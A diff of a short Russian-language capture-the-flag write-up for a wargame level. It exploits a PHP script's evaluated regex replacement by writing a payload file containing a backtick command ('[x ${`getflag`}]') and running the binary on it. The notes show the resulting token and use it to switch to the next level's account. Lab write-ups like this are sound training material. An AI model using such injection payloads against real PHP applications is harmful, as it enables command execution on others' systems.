@@ -1,14 +1,16 @@
 level06
 
-ls
+> ls
 В папке 2 файла level06 и level06.php
 
-./level06 выдает ошибку:
+> ./level06 
+Выдает ошибку:
 PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
 
 Вывод: ./level06 комплилился из level06.php, просит файл в качестве параметра
 
-cat level06.php
+> cat level06.php
+
 #!/usr/bin/php
 <?php
 function y($m) {
@@ -39,13 +41,15 @@ google it: http://www.madirish.net/402
 Исходя из этого наша задача состоит в том, чтобы вызвать функцию getflag. 
 Для этого передаем ее в качестве аргумента, не нарушая регулярное выражение.
 Т.е. вместо файла подложим созданный нами файл с getflag:
-echo '[x ${`getflag`}]' > /tmp/getflag
-./level06 /tmp/getflag
+
+> echo '[x ${`getflag`}]' > /tmp/getflag
+> ./level06 /tmp/getflag
+
 Вывод:
 	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 	in /home/user/level06/level06.php(4) : regexp code on line 1
 
-su level07
+> su level07
 wiok45aaoguiboiki2tuin6ub
 
 Done!
